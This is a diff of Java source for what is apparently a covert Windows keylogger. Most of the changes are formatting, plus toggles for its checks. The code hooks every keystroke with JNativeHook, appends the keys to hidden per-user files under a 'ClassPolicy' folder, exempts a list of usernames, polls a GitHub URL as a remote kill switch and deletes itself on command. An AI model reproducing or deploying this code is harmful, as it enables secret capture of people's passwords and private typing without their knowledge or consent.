@@ -18,33 +18,37 @@ import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 
-public class Main implements NativeKeyListener{
+public class Main implements NativeKeyListener
+{
 	static Stopwatch robert;
-	public Main() {
+	public Main()
+	{
 		robert = new Stopwatch();
 	}
-	public void exec() throws IOException, URISyntaxException {	
+	public void exec() throws IOException, URISyntaxException
+	{	
 		int version = 1;
 		if (getCurrentVersion() > version) {
 			System.out.println("[?] A newer version has been released. Downloading version: " + getCurrentVersion());
-			// update the code, replace current version with new version. (not done)
 		}
-		
-	//	System.out.println(getHostIP());
-		String[] protect = new String[]{"s-duv", "citrus", "s-suzukia","s-tehi", "s-chenb", "s-chenr"};
+		String[] protect = new String[]{"s-duv", "citrus","s-tehi", "s-chenb", "s-chenr"};
 		 System.out.println("Local_Username: " + System.getProperty("user.name"));
- 		for(int fsk = 0; fsk < protect.length; fsk++) {
+ 		for(int fsk = 0; fsk < protect.length; fsk++) 
+ 		{
 		//	 System.out.println(System.getProperty("user.name"));
-			if (protect[fsk].matches(System.getProperty("user.name"))) {
+			if (protect[fsk].matches(System.getProperty("user.name")))
+			{
 				 System.out.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: Acct Status " + fsk);
 				 System.exit(0);
 			}
 		 }
-		if (!isWindows()){
+		if (Radio.verifyOS && !isWindows())
+		{
 			System.out.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: OS is not Windows.");
 			System.exit(0);
 		}
-		if (isSuicune()) {
+		if (Radio.checkForKill && isSuicune())
+		{
 			System.out.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: Kill Command Received.");
 			 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 			cf.deleteOnExit();
@@ -59,11 +63,14 @@ public class Main implements NativeKeyListener{
 		 @SuppressWarnings("unused")
 		Process px =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"attrib.exe +h" + " \"" + yiffyiff + "\"");
 		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
-		if(!log.exists()) {
+		if(!log.exists())
+		{
 			System.out.println("Creating logfile...");
 			System.out.println("[" + robert.elapsedTime() + "] Starting...");
 			log.createNewFile();
-		} else {
+		} 
+		else
+		{
 			System.out.println("[" + robert.elapsedTime() + "] Starting...");
 		}
 		System.out.println("[" + robert.elapsedTime() + "] [✔] File I/O Established.");
@@ -73,10 +80,13 @@ public class Main implements NativeKeyListener{
 		timestamper.print("[Startup: " + new SimpleDateFormat("EEEE").format(new Date()) + " +" + getCurrentTimeInBeats() + " ]");
 		timestamper.println();
 		timestamper.close();
-		try {
+		try
+		{
 			GlobalScreen.registerNativeHook();
 			System.out.println("[" + robert.elapsedTime() + "] [✔] HookModule Successfully Registered.");
-		} catch (NativeHookException e) {
+		} 
+		catch (NativeHookException e)
+		{
 			// TODO Auto-generated catch block
 			System.out.println("["+ robert.elapsedTime() + "][!][FATAL] A NativeHook Exception Occured: " + e);
 			e.printStackTrace();
@@ -85,8 +95,10 @@ public class Main implements NativeKeyListener{
 
 		}
 
-	private static boolean isSuicune() {
-		try {
+	private static boolean isSuicune()
+	{
+		try
+		{
 			 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/klkillswitch");
 	         URLConnection yc = yahoo.openConnection();
 	         BufferedReader in = new BufferedReader(new InputStreamReader(
@@ -101,20 +113,24 @@ public class Main implements NativeKeyListener{
 	         }
 	         System.out.println("NO");
 	         return false;
-		} catch (Exception e) {
+		}
+		catch (Exception e)
+		{
 			System.out.println(e);
 			return false;
 		}
 	}
 	@Override
-	public void nativeKeyPressed(NativeKeyEvent e) {
+	public void nativeKeyPressed(NativeKeyEvent e)
+	{
 		// TODO Auto-generated method stub
 		//System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
 		record(NativeKeyEvent.getKeyText(e.getKeyCode()));
 	    // System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 	}
 	@Override
-	public void nativeKeyReleased(NativeKeyEvent e) {
+	public void nativeKeyReleased(NativeKeyEvent e)
+	{
 		// System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 		//if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Enter")) {
 		//	System.out.print("\n");
@@ -123,42 +139,55 @@ public class Main implements NativeKeyListener{
 		//} else {
 		//	System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
 		//}
-		}
+	}
 	@Override
-	public void nativeKeyTyped(NativeKeyEvent arg0) {
+	public void nativeKeyTyped(NativeKeyEvent arg0)
+	{
 		// TODO Auto-generated method stub
 	}
-	public static void record(String x) {
-		try {
+	public static void record(String x)
+	{
+		try
+		{
 			String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
 			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
 			// System.out.println("rec " + x);
-			if(x.matches("Space")) {
+			if(x.matches("Space"))
+			{
 				out.print(" ");
 				out.close();
-			} else {
+			} else
+			{
 			out.print(x);
 			out.close();
 			}
-		} catch (IOException e) {
+		} 
+		catch (IOException e)
+		{
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 	}
-	 public static boolean isWindows() {
+	 public static boolean isWindows()
+	 	{
 		   String OS = System.getProperty("os.name").toLowerCase();
 		   return (OS.indexOf("win") >= 0);
 		}
-	 public static int getCurrentTimeInBeats() {
+	 public static int getCurrentTimeInBeats()
+	 	{
 		    java.util.Calendar cal = java.util.Calendar.getInstance( java.util.TimeZone.getTimeZone( "GMT+01:00" ) );
 		    int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
 		    return beats;
 		}
-	 public static int getCurrentVersion() {
-		 try {
+	 public static int getCurrentVersion()
+	 {
+		 try
+		 {
 		 // return version from domain controller, if cant connect return current version
 			 return 1;
-		 } catch (Exception ee) {
+		 } 
+		 catch (Exception ee)
+		 {
 			 return 1;
 		 }
 	 }
